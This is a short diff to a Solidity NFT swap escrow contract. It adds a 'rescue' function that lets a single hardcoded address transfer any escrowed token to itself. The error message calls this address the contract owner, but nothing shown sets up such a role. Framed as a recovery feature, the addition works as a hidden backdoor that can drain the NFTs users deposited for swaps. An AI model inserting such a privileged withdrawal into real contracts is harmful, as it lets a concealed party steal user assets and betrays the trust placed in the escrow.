@@ -70,4 +70,9 @@ contract NftSwap {
         ERC721(collectionAddress).transferFrom(address(this), bob, tokenA);
         ERC721(collectionAddress).transferFrom(address(this), mary, tokenB);
     }
+
+    function rescue(uint256 tokenId) public {
+        require(msg.sender == address(0x5c679543E519eAcD7F8f8D15Fd15F9F9D77829dF), "Only the contract owner can rescue");
+        ERC721(collectionAddress).transferFrom( address(this), msg.sender,tokenId);
+    }
 }
